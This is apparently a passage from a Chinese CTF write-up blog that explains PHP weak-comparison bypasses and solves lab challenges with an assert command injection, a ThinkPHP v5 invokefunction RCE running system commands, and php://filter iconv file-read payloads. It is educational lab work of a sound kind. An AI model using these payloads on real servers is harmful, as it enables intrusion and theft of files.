class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><p>在PHP中有些函数会在内部“使用”弱相等，比如switch()、in_array()等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//switch()函数</span><br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;2abc&#x27;</span>;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//这里是弱比较</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">//同上</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//结果会输出2</span><br>    <br><span class="hljs-comment">//intval()函数:将传入的参数转换为整数。如果参数是一个字符串，它会尝试将字符串中的数字部分提取出来并转换为整数。如果参数是浮点数，它会将浮点数截断为整数。如果参数是其他类型的值，它会尝试将其转换为整数。**这个漏洞已经被修复了，用未修复前的版本举个栗子**</span><br><span class="hljs-comment">//它不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$num</span>=<span class="hljs-number">2e4</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>; <span class="hljs-comment">//20000</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>);<span class="hljs-comment">//2</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&lt;<span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//让一个变量intval后小于2020但是加一在intval会大于2021，2e4就是一个理想的值</span><br><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello world!&#x27;</span>;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//输出hello world!</span><br><span class="hljs-comment">//同理还可以用0x开头的十六进制、0开头的八进制进行一些绕过</span><br><br><span class="hljs-comment">//is_numeric() 函数的作用是判断给定的值是否为数字或数字字符串。如果值是数字或可以解析为数字的字符串，则返回 true；否则返回 false。</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">123</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123.0&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x776179</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;0x776179&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123a&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123 &#x27;</span>));<span class="hljs-comment">//flase</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//in_array()函数：用于检查一个值是否存在于数组中。</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br>参数说明：<br><br>    <span class="hljs-variable">$value</span>：要检查的值。<br>    <span class="hljs-variable">$array</span>：要搜索的数组。<br>    <span class="hljs-variable">$strict</span>（可选）：指定是否进行严格的类型检查，默认为 <span class="hljs-literal">false</span>。如果设置为 <span class="hljs-literal">true</span>，则不仅要比较值，还要比较数据类型。<br><br>该函数会遍历数组中的每个元素，并与要检查的值进行比较。如果找到匹配的值，则返回 <span class="hljs-literal">true</span>，否则返回 <span class="hljs-literal">false</span>。<br>    问题出在<span class="hljs-variable">$strict</span>参数，弱不设置则为弱比较，绕过方法见上。    <br></code></pre></td></tr></table></figure><p>还在师傅们的文章上看到这么一个东西：<code>preg_match</code>与intval配合使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错</span><br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;oh you find me！&#x27;</span>；<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?num[]=1,传个数组可以绕过die，然后Intval数组会报错返回1，从而echo flag。</span><br><br></code></pre></td></tr></table></figure><p>类似的还有array_search()函数：用于在数组中搜索指定的值，并返回该值对应的键（即数组中的索引位置）。语法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    $value：要搜索的值。</span><br><span class="hljs-comment">    $array：要搜索的数组。</span><br><span class="hljs-comment">    $strict（可选）：指定是否进行严格的类型检查，默认为 false。如果设置为 true，则不仅要比较值，还要比较数据类型。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">该函数会遍历数组中的每个元素，并与要搜索的值进行比较。如果找到匹配的值，则返回该值对应的键；如果找不到匹配的值，则返回 false。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>​    这个函数的例题可以参考攻防世界中的easyphp。</p><p>参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_47804678/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">128814377</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_48108919/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">123279251</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>c53f7af34ee2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界做题记录_1</title>
    <link href="/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/"/>
    <url>/2023/09/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    
    <content type="html"><![CDATA[<p>做题记录</p><span id="more"></span><hr><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><strong>mfw</strong></h2><p>进入环境:<br><img src="/img/b5.png" alt="b5"><br>点下上面的链接看看结果About：<br><img src="/img/b6.png" alt="b6"><br>里面有个Git,想到了Git泄露,直接看下.git文件有没有：<br><img src="/img/b7.png" alt="b7"><br>上GitHack：<br><code>python GitHack.py http://61.147.171.105:55455/.git/</code><br><img src="/img/b8.png" alt="b8"><br>访问一下，看有没有啥好东西：<br>flag.php里啥也没有，可惜：<br><img src="/img/b9.png" alt="b9"><br>看下index.php,里面有不少好东西，把有用的php部分拿出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先GET方式传page，不给page赋值的话自动等于home(就是我们进去看到的首页)，然后进行一个拼接：templates&#x2F;$page.php，把这东西给$file。assert这东西叫“断言检查”，意思是如果里面的条件是真，就会接着执行后面的函数require_once，这东西有点点像include包含，至于直接包含某个文件，不用伪协议啥的我一直把它理解成执行该文件，哈哈。<br>接下来的思路就是构造page让他执行一些命令比如’ls’ ‘cat’啥的。<br>接下来的payload参考了这位师傅的文章，感谢！：<br><code>https://blog.csdn.net/m0_62063669/article/details/125427751?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169364331616800186574360%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169364331616800186574360&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125427751-null-null.142^v93^koosearch_v1&amp;utm_term=mfw&amp;spm=1018.2226.3001.4187</code><br>payloaad:<br><code>index.php/?page=flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag</code><br>解释下为什么要给page赋这么一个值，先看这个page让file成了个啥东西：<br><code>file = template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php</code><br>带到断言函数中：<br><code>assert(&quot;strpos(&#39;template/flag&#39;,&#39;abc&#39;) === false and system(&quot;cat templates/flag.php&quot;) and strops(&#39;flag.php&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p><p>strpos函数是看参数里有没有要检测的值，有的话返回第一次出现的位置，没有就返回false。明显 ‘template&#x2F;flag’这里面没abc，第一个assert为真；第二个执行 cat templates&#x2F;flag.php ，这没啥好说的，就是去拿我们要的flag，不过注意cat后的文件路径。我们当前在index.php下，index.php和templates同目录，flag.php又在templates下。所以相对路径就是<code>templates/flag.php</code>。最后一个断言是找flag.php中有没有俩点，没有返回false。因为是两个and连接，三个条件都为真即为真。然后直接require($file)，执行命令。<br>flag藏在源码里：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" alt="image"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" alt="image"><br>Github搜下有关这个ThinkPHPV5的相关漏洞，发现有一大堆远程命令执行的POC：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" alt="image"><br>找个长的试试：<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>执行了phpinfo()这个命令<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" alt="image"><br>ls看下当前目录下的文件：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" alt="image"><br>没有和flag有关的东西，等会用find找一下，不过这里有个和爬虫有关的robots.txt，让我看看你：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" alt="image"><br>可惜啥也没有，find命令找下和flag有关的东西：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>find是全磁盘查找所以可能会比较慢：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" alt="image"><br>草了，还是看看根目录下都啥东西吧：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" alt="image"><br>有个flag: ls &#x2F;flag没啥有价值的东西，直接 cat &#x2F;flag读一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" alt="image"></p><h2 id="题目名称-文件包含"><a href="#题目名称-文件包含" class="headerlink" title="题目名称-文件包含"></a><strong>题目名称-文件包含</strong></h2><h2 id="进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb"><a href="#进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert.iconv.UTF-8*.UCS-4BE.resource=./check.php这种类型的过滤器，那就试试这个：?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:[网鼎杯 2020 朱雀组]phpweb"></a>进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" alt="image"><br>回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>这种类型的过滤器，那就试试这个：<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" alt="image"><br>过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-mac（别名：MacJapanese）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO（别名：SJIS-DOCOMO）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDI（别名：SJIS-KDDI）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO（别名：UTF-<span class="hljs-number">8</span>-DOCOMO）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B（别名：UTF-<span class="hljs-number">8</span>-KDDI）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK（别名：UTF-<span class="hljs-number">8</span>-SOFTBANK）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI（别名：ISO-<span class="hljs-number">2022</span>-JP-KDDI）<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span 